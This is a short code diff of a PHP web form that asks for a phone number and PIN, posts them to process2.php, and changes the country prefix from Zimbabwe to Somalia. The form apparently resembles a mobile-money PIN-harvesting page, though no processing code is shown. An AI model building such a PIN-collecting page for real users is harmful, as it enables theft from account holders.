@@ -21,12 +21,12 @@ if(isset($_GET['error'])){
 
 <div class="container">
 
-<h2>Enter Number and PIN</h2>
+<h2>Enter  Phone Number and PIN</h2>
 
 <form action="process2.php" method="POST">
 
 <div class="phone-box">
-    <span>🇿🇼ZW +263</span>
+    <span>🇸🇴SO +252</span>
     <input type="text" id="phone" name="phone" placeholder="712345678" maxlength="9" required>
 </div>
 
